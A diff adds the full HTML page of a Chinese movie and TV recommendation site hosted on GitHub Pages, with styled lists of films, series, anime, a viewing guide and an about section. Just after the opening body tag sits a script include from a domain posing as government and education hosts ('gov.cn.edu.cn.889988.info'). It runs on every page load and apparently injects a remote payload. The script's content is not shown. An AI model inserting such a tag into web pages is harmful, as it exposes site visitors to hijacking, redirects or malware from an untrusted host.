@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>丝雅电影网｜高清院线大片、热播剧集与动漫综艺在线点播平台</title>
+<meta name="keywords" content="丝雅电影网, siyadianyingwang-zh.github.io, 免费电影在线观看, 高清电视剧点播, 最新院线大片, 热播动漫综艺, 影视资源推荐, 华语电影盘点, 欧美剧集解说, 韩剧日剧更新">
+<meta name="description" content="丝雅电影网（siyadianyingwang-zh.github.io）专注于为影迷整理院线大片、经典华语电影、热播剧集、动漫与综艺资源。每日更新影视榜单、口碑解说与观看指南，带你发现值得一看的好内容。">
+<link rel="canonical" href="https://siyadianyingwang-zh.github.io/">
+<style>
+:root{
+  --bg:#0b0d17;
+  --bg2:#11141f;
+  --card:#161a26;
+  --line:#262b3a;
+  --txt:#eef0f6;
+  --sub:#9aa1b4;
+  --brand:#ff5b6a;
+  --brand2:#ffb547;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",-apple-system,sans-serif;
+  background:var(--bg);
+  color:var(--txt);
+  line-height:1.7;
+  -webkit-font-smoothing:antialiased;
+}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 20px}
+
+/* ===== top bar ===== */
+.topbar{
+  position:sticky;top:0;z-index:50;
+  background:rgba(11,13,23,.92);
+  backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--line);
+}
+.topbar .wrap{display:flex;align-items:center;justify-content:space-between;height:60px}
+.logo{font-size:20px;font-weight:800;letter-spacing:.5px}
+.logo span{color:var(--brand)}
+.hosting{font-size:12px;color:var(--sub)}
+.hosting b{color:var(--brand2);font-weight:600}
+@media(max-width:640px){.hosting{display:none}}
+
+/* ===== nav ===== */
+nav{background:var(--bg2);border-bottom:1px solid var(--line)}
+nav .wrap{display:flex;gap:6px;overflow-x:auto}
+nav a{
+  flex:none;padding:14px 16px;font-size:14px;color:var(--sub);
+  border-bottom:2px solid transparent;transition:.2s;white-space:nowrap;
+}
+nav a:hover{color:var(--txt);border-color:var(--brand)}
+
+/* ===== hero ===== */
+.hero{
+  position:relative;overflow:hidden;
+  background:
+    radial-gradient(900px 400px at 85% -10%,rgba(255,91,106,.25),transparent 60%),
+    radial-gradient(700px 400px at 0% 10%,rgba(255,181,71,.15),transparent 55%),
+    var(--bg2);
+  padding:64px 0 56px;
+}
+.hero h1{font-size:34px;line-height:1.35;font-weight:800;margin-bottom:16px}
+.hero h1 em{font-style:normal;background:linear-gradient(90deg,#ff5b6a,#ffb547);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero p{color:var(--sub);max-width:640px;margin-bottom:26px;font-size:15px}
+.hero-btns{display:flex;flex-wrap:wrap;gap:12px}
+.btn{
+  display:inline-block;padding:11px 26px;border-radius:30px;font-size:14px;font-weight:600;transition:.25s;
+}
+.btn-main{background:var(--brand);color:#fff}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 10px 24px rgba(255,91,106,.35)}
+.btn-ghost{border:1px solid var(--line);color:var(--txt)}
+.btn-ghost:hover{background:var(--card);border-color:var(--brand2)}
+
+/* ===== section ===== */
+section{padding:52px 0}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:26px;flex-wrap:wrap}
+.sec-head h2{font-size:22px;position:relative;padding-left:14px}
+.sec-head h2::before{content:"";position:absolute;left:0;top:6px;bottom:6px;width:4px;border-radius:3px;background:linear-gradient(var(--brand),var(--brand2))}
+.sec-head .more{font-size:13px;color:var(--sub)}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:20px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.25s}
+.card:hover{transform:translateY(-4px);border-color:var(--brand)}
+.thumb{height:130px;display:flex;align-items:center;justify-content:center;font-size:40px;font-weight:800;color:rgba(255,255,255,.8)}
+.card:nth-child(5n+1) .thumb{background:linear-gradient(135deg,#4f46e5,#7c3aed)}
+.card:nth-child(5n+2) .thumb{background:linear-gradient(135deg,#e11d48,#f97316)}
+.card:nth-child(5n+3) .thumb{background:linear-gradient(135deg,#0ea5e9,#14b8a6)}
+.card:nth-child(5n+4) .thumb{background:linear-gradient(135deg,#16a34a,#84cc16)}
+.card:nth-child(5n+5) .thumb{background:linear-gradient(135deg,#ca8a04,#f59e0b)}
+.card-body{padding:14px}
+.card-body h3{font-size:15px;margin-bottom:6px}
+.card-body .meta{font-size:12px;color:var(--sub);display:flex;gap:10px;flex-wrap:wrap}
+
+/* ===== list layout ===== */
+.list{display:grid;gap:12px}
+.list-row{
+  display:grid;grid-template-columns:64px 1fr auto;gap:16px;align-items:center;
+  background:var(--card);border:1px solid var(--line);border-radius:12px;padding:14px 16px;transition:.2s;
+}
+.list-row:hover{border-color:var(--brand2)}
+.num{font-size:22px;font-weight:800;color:var(--line)}
+.list-row:hover .num{color:var(--brand2)}
+.list-row .info h3{font-size:15px}
+.list-row .info p{font-size:13px;color:var(--sub)}
+.tag{font-size:12px;color:var(--sub);border:1px solid var(--line);padding:3px 10px;border-radius:20px}
+
+/* ===== columns ===== */
+.cols{display:grid;grid-template-columns:1.4fr 1fr;gap:20px}
+@media(max-width:820px){.cols{grid-template-columns:1fr}}
+.notice{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:22px}
+.notice h3{font-size:16px;margin-bottom:12px;color:var(--brand2)}
+.notice ul{list-style:none;display:grid;gap:10px}
+.notice li{font-size:14px;color:var(--sub);padding-left:18px;position:relative}
+.notice li::before{content:"";position:absolute;left:0;top:9px;width:6px;height:6px;border-radius:50%;background:var(--brand)}
+.two-col{columns:2;column-gap:28px}
+@media(max-width:640px){.two-col{columns:1}}
+.two-col p{break-inside:avoid;margin-bottom:14px;font-size:14px;color:var(--sub)}
+.two-col p b{color:var(--txt);font-weight:600}
+
+/* ===== footer ===== */
+footer{background:var(--bg2);border-top:1px solid var(--line);padding:40px 0 28px;margin-top:30px}
+.foot-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:24px;margin-bottom:30px}
+@media(max-width:720px){.foot-grid{grid-template-columns:repeat(2,1fr)}}
+.foot-grid h4{font-size:14px;margin-bottom:12px;color:var(--brand2)}
+.foot-grid ul{list-style:none;display:grid;gap:8px}
+.foot-grid a{font-size:13px;color:var(--sub)}
+.foot-grid a:hover{color:var(--brand)}
+.copy{text-align:center;font-size:12px;color:#5f6678;border-top:1px solid var(--line);padding-top:20px}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="topbar">
+  <div class="wrap">
+    <div class="logo">丝雅<span>电影网</span></div>
+    <div class="hosting">访问地址：<b>siyadianyingwang-zh.github.io</b></div>
+  </div>
+</div>
+
+<nav>
+  <div class="wrap">
+    <a href="#home">首页</a>
+    <a href="#movie">院线大片</a>
+    <a href="#tv">热播剧集</a>
+    <a href="#anime">动漫综艺</a>
+    <a href="#guide">观影指南</a>
+    <a href="#about">关于本站</a>
+  </div>
+</nav>
+
+<header class="hero" id="home">
+  <div class="wrap">
+    <h1>在<em>丝雅电影网</em>，<br>找到下一部让你上头的好片</h1>
+    <p>这里不是播放器，而是一份持续更新的影视观影清单。我们按类型、口碑与上映节奏整理院线大片、经典华语电影、热播剧集、动漫与综艺，并附上简短解说与选片建议，帮你少花时间找片、多一点时间享受。</p>
+    <div class="hero-btns">
+      <a class="btn btn-main" href="#movie">看看本周院线</a>
+      <a class="btn btn-ghost" href="#guide">新手选片指南</a>
+    </div>
+  </div>
+</header>
+
+<section id="movie">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>院线大片 · 最新上映与口碑盘点</h2>
+      <a class="more" href="#">查看完整榜单 →</a>
+    </div>
+    <div class="grid">
+      <div class="card">
+        <div class="thumb">孤</div>
+        <div class="card-body">
+          <h3>孤注一掷的棋局</h3>
+          <div class="meta"><span>悬疑 / 犯罪</span><span>2026 上映</span></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="thumb">海</div>
+        <div class="card-body">
+          <h3>海边的审判日</h3>
+          <div class="meta"><span>剧情 / 人性</span><span>豆瓣 8.4</span></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="thumb">极</div>
+        <div class="card-body">
+          <h3>极地救援队</h3>
+          <div class="meta"><span>动作 / 冒险</span><span>IMAX 推荐</span></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="thumb">爱</div>
+        <div class="card-body">
+          <h3>爱情停在第八站</h3>
+          <div class="meta"><span>爱情 / 治愈</span><span>女性向口碑</span></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="thumb">怪</div>
+        <div class="card-body">
+          <h3>怪兽与便利店</h3>
+          <div class="meta"><span>奇幻 / 喜剧</span><span>合家欢</span></div>
+        </div>
+      </div>
+      <div class="card">
+        <div class="thumb">归</div>
+        <div class="card-body">
+          <h3>归途的列车</h3>
+          <div class="meta"><span>纪实 / 剧情</span><span>获奖影片</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="tv" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>热播剧集 · 华语、韩剧与欧美剧</h2>
+      <a class="more" href="#">查看完整榜单 →</a>
+    </div>
+    <div class="list">
+      <div class="list-row">
+        <div class="num">01</div>
+        <div class="info">
+          <h3>沉默的谈判者</h3>
+          <p>刑侦犯罪 · 32 集 · 被誉为今年尺度最大的国产剧之一</p>
+        </div>
+        <span class="tag">追剧中</span>
+      </div>
+      <div class="list-row">
+        <div class="num">02</div>
+        <div class="info">
+          <h3>首尔的雪夜</h3>
+          <p>韩剧 · 16 集 · 财阀继承与律政博弈的双线叙事</p>
+        </div>
+        <span class="tag">已完结</span>
+      </div>
+      <div class="list-row">
+        <div class="num">03</div>
+        <div class="info">
+          <h3>最后的边境线</h3>
+          <p>欧美剧 · 第一季 10 集 · 高分冷门西部题材</p>
+        </div>
+        <span class="tag">补剧中</span>
+      </div>
+      <div class="list-row">
+        <div class="num">04</div>
+        <div class="info">
+          <h3>巷口的烟火气</h3>
+          <p>华语剧 · 24 集 · 小人物群像，治愈系下饭首选</p>
+        </div>
+        <span class="tag">追剧中</span>
+      </div>
+      <div class="list-row">
+        <div class="num">05</div>
+        <div class="info">
+          <h3>东京深夜食堂 3</h3>
+          <p>日剧 · 12 集 · 美食与人生的短篇集</p>
+        </div>
+        <span class="tag">已完结</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="anime" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>动漫综艺 · 轻松下饭内容</h2>
+      <a class="more" href="#">查看完整榜单 →</a>
+    </div>
+    <div class="cols">
+      <div class="grid">
+        <div class="card">
+          <div class="thumb">光</div>
+          <div class="card-body">
+            <h3>光影少年团</h3>
+            <div class="meta"><span>热血番</span><span>连载中</span></div>
+          </div>
+        </div>
+        <div class="card">
+          <div class="thumb">猫</div>
+          <div class="card-body">
+            <h3>猫咖里的哲学家</h3>
+            <div class="meta"><span>治愈番</span><span>全 12 话</span></div>
+          </div>
+        </div>
+        <div class="card">
+          <div class="thumb">星</div>
+          <div class="card-body">
+            <h3>星空快递公司</h3>
+            <div class="meta"><span>科幻番</span><span>连载中</span></div>
+          </div>
+        </div>
+        <div class="card">
+          <div class="thumb">声</div>
+          <div class="card-body">
+            <h3>声优的周末</h3>
+            <div class="meta"><span>综艺</span><span>周更</span></div>
+          </div>
+        </div>
+      </div>
+      <div class="notice">
+        <h3>本周综艺看点</h3>
+        <ul>
+          <li>真人秀《城市夜行者》：深夜街头挑战赛，第 7 期反转不断</li>
+          <li>脱口秀《明天说什么》：嘉宾阵容升级，话题尺度开放</li>
+          <li>美食纪实《一城一味》：走进潮汕，讲清一碗牛肉丸的讲究</li>
+          <li>音乐综艺《未完成的歌》：原创作品数量创季度新高</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="guide" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>观影指南 · 选片不踩坑</h2>
+    </div>
+    <div class="cols">
+      <div class="card" style="padding:22px">
+        <h3 style="font-size:16px;margin-bottom:14px">不同心情，怎么选片？</h3>
+        <div class="two-col">
+          <p><b>想提神醒脑</b>：优先悬疑、犯罪与动作类院线片，节奏快、反转多，适合周末一个人看。</p>
+          <p><b>想放松下饭</b>：治愈系动漫、生活流剧集与美食综艺最合适，不用记复杂人物关系。</p>
+          <p><b>想看完有话说</b>：选剧情向获奖片或高分韩剧，适合和朋友一起讨论人物动机。</p>
+          <p><b>想陪家人一起</b>：合家欢动画、自然纪录片与年代剧，老少都能看进去。</p>
+          <p><b>想补经典</b>：别只看热门榜，可以按导演、演员或电影节片单系统补片，体验更完整。</p>
+          <p><b>想节省时间</b>：优先 90 分钟以内的短片与单元剧，通勤、午休也能看完一个故事。</p>
+        </div>
+      </div>
+      <div class="notice">
+        <h3>本站更新说明</h3>
+        <ul>
+          <li>院线栏目：每周一更新当周上映与口碑变化</li>
+          <li>剧集栏目：追更进度同步更新，标注已完结 / 追剧中</li>
+          <li>榜单排序：综合口碑、热度与更新时效，不收任何推广费用</li>
+          <li>内容定位：影视资讯与选片推荐，不涉及在线播放服务</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="about" style="padding-top:0">
+  <div class="wrap">
+    <div class="sec-head">
+      <h2>关于丝雅电影网</h2>
+    </div>
+    <div class="card" style="padding:26px">
+      <div class="two-col">
+        <p><b>网站名称：</b>丝雅电影网（简称「丝雅电影」）。</p>
+        <p><b>网站网址：</b><a href="https://siyadianyingwang-zh.github.io" style="color:var(--brand2)">https://siyadianyingwang-zh.github.io</a>，GitHub Pages 静态托管。</p>
+        <p><b>站点定位：</b>一个面向普通影迷的影视资讯与选片推荐页面，用清晰分类与简短解说降低选片成本。</p>
+        <p><b>内容结构：</b>包含院线大片、热播剧集、动漫综艺、观影指南、关于本站共 5 个栏目，移动端自适应排版。</p>
+        <p><b>更新原则：</b>榜单随上映与口碑变化持续调整，标注更新时间与热度状态，方便回头查看。</p>
+        <p><b>内容声明：</b>本站仅提供影视介绍与选片建议，不提供在线播放、下载或资源分享服务。</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div>
+        <h4>网站名称</h4>
+        <ul><li>丝雅电影网</li><li>丝雅电影</li></ul>
+      </div>
+      <div>
+        <h4>网站网址</h4>
+        <ul><li>siyadianyingwang-zh.github.io</li><li>影视资讯与选片推荐</li></ul>
+      </div>
+      <div>
+        <h4>栏目导航</h4>
+        <ul>
+          <li><a href="#movie">院线大片</a></li>
+          <li><a href="#tv">热播剧集</a></li>
+          <li><a href="#anime">动漫综艺</a></li>
+        </ul>
+      </div>
+      <div>
+        <h4>实用信息</h4>
+        <ul>
+          <li><a href="#guide">观影指南</a></li>
+          <li><a href="#about">关于本站</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      © 2026 丝雅电影网 · 网站网址：https://siyadianyingwang-zh.github.io · 网站名称：丝雅电影网 · 本站仅提供影视资讯与选片推荐，不提供在线播放、下载或资源分享服务
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
